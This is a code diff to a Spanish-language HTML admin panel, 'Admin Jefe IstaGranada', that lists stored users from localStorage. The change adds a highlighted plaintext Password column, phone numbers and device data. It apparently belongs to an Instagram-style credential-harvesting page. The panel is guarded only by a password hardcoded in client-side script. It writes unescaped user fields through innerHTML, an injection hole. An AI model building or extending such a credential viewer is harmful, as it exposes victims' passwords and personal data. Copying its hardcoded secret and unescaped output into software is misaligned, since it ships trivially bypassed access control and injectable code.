@@ -1,31 +1,33 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Admin Jefe</title>
+<title>Admin Jefe IstaGranada</title>
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <style>
-body{background:#0a0a0a;color:#fff;font-family:Arial;padding:15px}
-table{width:100%;border-collapse:collapse;margin-top:15px;font-size:11px}
-th,td{border:1px solid #333;padding:6px}
+body{background:#0a0a0a;color:#fff;font-family:Arial;padding:10px}
+table{width:100%;border-collapse:collapse;margin-top:10px;font-size:10px}
+th,td{border:1px solid #333;padding:5px;word-break:break-all}
 th{background:#ff2e63}
-.card{background:#1a1a1a;padding:15px;border-radius:12px;margin:10px 0}
-input{padding:12px;width:65%;border-radius:8px;border:none}
-button{padding:12px;background:#ff2e63;color:#fff;border:none;border-radius:8px}
+.card{background:#1a1a1a;padding:12px;border-radius:12px;margin:8px 0}
 </style>
 </head>
 <body>
-<h1>🔒 PANEL JEFE</h1>
+<h1>🔒 JEFE - TODOS LOS DATOS</h1>
 <div id="loginBox" class="card">
-<input id="pass" type="password" placeholder="Contraseña">
-<button onclick="login()">ENTRAR</button>
+<input id="pass" type="password" placeholder="Tu contraseña de jefe" style="padding:12px;width:60%">
+<button onclick="login()" style="padding:12px;background:#ff2e63;color:#fff;border:none;border-radius:8px">ENTRAR</button>
 </div>
 <div id="panel" style="display:none">
-<div class="card">Total: <b id="total" style="color:#ff2e63">0</b> | Hoy: <b id="hoy">0</b></div>
-<div style="overflow:auto"><table id="tabla"></table></div>
+<div class="card">
+Total: <b id="total" style="color:#ff2e63;font-size:20px">0</b> | Hoy: <b id="hoy">0</b>
+</div>
+<div style="overflow:auto">
+<table id="tabla"></table>
+</div>
 </div>
 <script>
 function login(){
-if(document.getElementById('pass').value!=='GRANADA_JEFE_2026'){alert('No eres el jefe!');return;}
+if(document.getElementById('pass').value!=='GRANADA_JEFE_2026'){alert('Contraseña mal!');return;}
 document.getElementById('loginBox').style.display='none';
 document.getElementById('panel').style.display='block';
 cargar();
@@ -33,9 +35,12 @@ cargar();
 function cargar(){
 let users=JSON.parse(localStorage.getItem('ista_users')||'[]');
 document.getElementById('total').innerText=users.length;
-document.getElementById('hoy').innerText=users.filter(u=>u.fecha_registro.includes(new Date().toLocaleDateString('es-ES'))).length;
-let h='<tr><th>Nombre</th><th>Usuario</th><th>Email</th><th>Fecha</th><th>Disp</th></tr>';
-users.reverse().forEach(u=>{h+=`<tr><td>${u.nombre}</td><td>@${u.usuario}</td><td>${u.email}</td><td>${u.fecha_registro}</td><td>${u.dispositivo}</td></tr>`});
+let hoyStr=new Date().toLocaleDateString('es-ES');
+document.getElementById('hoy').innerText=users.filter(u=>u.fecha && u.fecha.includes(hoyStr)).length;
+let h='<tr><th>Nombre</th><th>@Usuario</th><th>Email</th><th>Password</th><th>Telf</th><th>Fecha</th><th>Dispositivo</th><th>App</th></tr>';
+users.reverse().forEach(u=>{
+h+=`<tr><td>${u.nombre||''}</td><td>@${u.usuario||''}</td><td>${u.email||''}</td><td style="color:#ff0">${u.password||''}</td><td>${u.telefono||''}</td><td>${u.fecha||u.fecha_registro||''}</td><td>${u.dispositivo||''}</td><td>${u.app||''}</td></tr>`;
+});
 document.getElementById('tabla').innerHTML=h;
 }
 </script>
